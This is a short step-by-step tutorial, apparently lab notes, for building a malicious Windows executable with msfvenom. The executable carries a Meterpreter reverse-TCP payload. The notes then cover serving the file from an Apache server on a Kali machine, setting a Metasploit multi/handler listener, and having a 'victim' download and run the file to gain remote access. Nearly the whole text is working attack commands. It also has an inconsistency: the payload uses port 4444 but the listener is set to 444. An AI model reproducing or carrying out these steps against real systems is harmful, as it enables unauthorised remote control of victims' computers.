CREATING A MALICIOUS FILE WITH MSFvenom

Only works on systems without antivirus programs.

- Type "msfconsole" in terminal to start the Metasploit framework.

- Enter this command for the payload: reverse TCP connection
$ "msfvenom -p windows/meterpreter/reverse_tcp LHOST={your-local-IP-address}
LPORT=4444 --format=exe > {filename}.exe"
** Your local IP address can be found by $ ifconfig

- Copy the file to the Apache web server directory
$ cp {filename}.exe /var/www/html
Makes the file accessible via a web server hosten on your Kali machine.

- Start the Apache web server using:
$ service apache2 start

- Set the listener to capture the incoming connection when the victim runs the file
$ use exploit/multi/handler
$ set payload windows/meterpreter/reverse_tcp
$ set LHOST {your-local-IP address}
$ set LPORT 444

- To begin listening
$ run

--> Switch from Kali VM to Windows machine <--
- Open a web browser
- Enter the loacl IP address of your Kali machine
(in the search bar): {local-IP}/{filename}.exe
- Save the file, and run it.

--> Switch to Kali VM <--
- You now have access to the target machine.
- To view system info, type: 
$ sysinfo
